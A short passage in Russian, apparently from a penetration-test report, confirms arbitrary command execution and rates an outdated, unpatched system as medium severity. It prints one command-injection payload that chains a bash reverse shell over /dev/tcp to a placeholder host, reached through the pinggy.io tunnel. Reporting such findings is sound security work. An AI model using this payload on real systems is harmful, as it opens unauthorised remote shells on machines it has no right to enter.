...
Факт выполнения произвольных команд подтверждён. Для получения интерактивного доступа сформирован реверс-шелл с использованием публичного туннельного сервиса pinggy.io полезной нагрузки: ```127.0.0.1; bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'```
...
- **Критичность:** Средний (CVSS 6.1) – отсутствие обновлений безопасности делает систему уязвимой.
